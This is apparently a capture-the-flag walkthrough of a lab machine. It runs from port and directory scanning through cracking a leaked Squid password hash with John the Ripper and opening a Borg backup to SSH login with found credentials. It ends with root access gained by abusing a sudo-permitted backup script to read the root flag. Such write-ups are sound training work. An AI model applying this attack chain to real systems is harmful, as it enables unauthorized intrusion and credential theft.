Not much information about the machine, so we get right into it.

## Recon

We start with Nmap and recon as always and we get: 

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:69:89:87:98:79 (Unknown)

```

Not much but enough. Next we enumarate with `gobuster dir -u http://[ip]/ -w /usr/share/wordlists/dirb/common.txt` and we get
```
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/admin (Status: 301)
/etc (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
```

We can access admin and etc so let's do that!

## Access

On /admin there is a sandwich menu with Home/Albums/Admins/Archive as options.
On home there is not much, but general html.
On archive we are redirected to the /admin page.
On /admins.html there is :
```
############################################
############################################
[Yesterday at 4.32pm from Josh]
Are we all going to watch the football game at the weekend??
############################################
############################################
[Yesterday at 4.33pm from Adam]
Yeah Yeah mate absolutely hope they win!
############################################
############################################
[Yesterday at 4.35pm from Josh]
See you there then mate!
############################################
############################################
[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
############################################
############################################
```

So we get a couple of names (potentialy usernames),  and the last message is very useful.


So now lets go to the /ect page.
We see the /squid directory the message was talking about, and inside there are two files.
passwd with :
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```
and squid.conf with:
```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

On the passwd file we have a #hashes  version of the password. So we are going to use [[John The Ripper]].
First we are going to identify the type of hash with hash-id.py program and get
```
Possible Hashs:
[+] MD5(APR)
```

Then we save the hashed password on a txt file and the begin searching with John :
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
and get <font color=red> squidward  </font> for password.


Going back to the /admin page we have a Download button on Archive .
Downloading we get a archive.tar folder. It contains a README file with:
```
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

After reading some stuff there I found this
`borg extract home/field/dev/final_archive::music_archive`
I installed borgbackup and the extracted the files, and then finally I run the command above. 
It asked for passphrase and I used <font color=red> squidward  </font> and got the results!

Searching through the folders I found a note.txt file with:
```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```
So immediately I tryied to ssh it.
`ssh alex@[ip]` and used <font color=red> S3cretP@s3 </font> for password and it worked!
There was my flag! But I have one more left.

So lets see what rights we have with `sudo -l`
```
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

```

I see that we have rights for backup.sh file. We can't write so we will add rights with
`chmod +w /etc/mp3backups/backup.sh`

Now we can use this file to write commands as a root like
`sudo /etc/mp3backups/backup.sh -c whoami`
so to find the flag I typed:
`sudo /etc/mp3backups/backup.sh -c 'cat /root/root.txt' ` 
and got it!